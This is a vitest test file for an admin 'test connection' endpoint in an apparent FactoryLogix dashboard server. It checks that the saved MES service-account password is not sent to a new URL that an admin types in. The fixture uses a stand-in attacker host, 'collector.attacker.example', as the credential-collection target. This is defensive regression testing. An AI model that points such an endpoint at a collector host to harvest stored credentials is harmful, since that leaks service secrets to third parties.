import { pino } from 'pino';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { DEFAULT_SETTINGS } from '@fld/shared';
import type { AppContext } from '../src/context.js';
import { signSession } from '../src/auth/session.js';
import { encrypt } from '../src/crypto.js';
import { SseHub } from '../src/sse.js';

vi.mock('../src/db/repo/settings.js', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../src/db/repo/settings.js')>()),
  getSettings: async () => DEFAULT_SETTINGS,
}));

const { buildServer } = await import('../src/server.js');

const SECRET = 'a-very-long-test-session-secret-value';
const KEY_HEX = 'ab'.repeat(32);
const STORED_PASSWORD = 'MES-service-account-Passw0rd!';
const STORED_URL = 'http://factorylogix.plant.local:6065/odata';
const basic = (user: string, password: string) => `Basic ${Buffer.from(`${user}:${password}`, 'utf8').toString('base64')}`;

/** The `settings` row `fl_connection` as the admin saved it (password encrypted at rest), and one admin user. */
function fakeDb() {
  const admin = { id: 1, username: 'admin', role: 'admin', active: true, created_at: new Date(0), last_login_at: null };
  const stored = { base_url: STORED_URL, username: 'svc-dashboard', password_enc: encrypt(STORED_PASSWORD, KEY_HEX) };
  const query = async (text: string, values: unknown[] = []) => {
    const sql = text.replace(/\s+/g, ' ').trim();
    if (sql.includes('FROM users WHERE id = $1')) return { rows: [admin], rowCount: 1 };
    if (sql.startsWith('SELECT key, value FROM settings WHERE key = $1') && values[0] === 'fl_connection') {
      return { rows: [{ key: 'fl_connection', value: stored }], rowCount: 1 };
    }
    return { rows: [], rowCount: 0 };
  };
  return { query };
}

let closers: Array<() => Promise<unknown>> = [];
beforeEach(() => {
  vi.stubEnv('ENCRYPTION_KEY', KEY_HEX);
});
afterEach(async () => {
  for (const close of closers) await close();
  closers = [];
  vi.unstubAllEnvs();
  vi.unstubAllGlobals();
});

describe('POST /api/admin/connection/test', () => {
  it('does not send the stored FactoryLogix password to a different host just because the admin typed a new URL', async () => {
    const outgoing: Array<{ url: string; authorization: string }> = [];
    vi.stubGlobal('fetch', async (url: string | URL, init?: { headers?: Record<string, string> }) => {
      outgoing.push({ url: String(url), authorization: init?.headers?.Authorization ?? '' });
      return new Response('not found', { status: 404, statusText: 'Not Found' });
    });

    const db = fakeDb();
    const log = pino({ level: 'silent' });
    const ctx = { env: { sessionSecret: SECRET }, pool: db, db, log, sse: new SseHub('postgres://unused', log), version: 'test' } as unknown as AppContext;
    const app = await buildServer(ctx);
    closers.push(() => app.close());
    const headers = { cookie: `fld_session=${await signSession({ userId: 1, role: 'admin' }, SECRET)}` };

    // "Test connection" from the settings page with the URL changed and the password box left blank
    // ("leave blank to keep the saved password"). The new URL is a machine the admin controls.
    const res = await app.inject({
      method: 'POST',
      url: '/api/admin/connection/test',
      headers,
      payload: { base_url: 'http://collector.attacker.example:8000/odata', username: 'svc-dashboard' },
    });
    expect(res.statusCode).toBe(200);

    const toOtherHost = outgoing.filter((call) => new URL(call.url).host !== new URL(STORED_URL).host);
    expect(toOtherHost.length, 'the server did call the new URL').toBeGreaterThan(0);
    const leaked = toOtherHost.filter((call) => call.authorization === basic('svc-dashboard', STORED_PASSWORD));
    expect(
      leaked.map((call) => call.url),
      'requests to a host other than the saved one that carried the saved password',
    ).toEqual([]);
  });
});
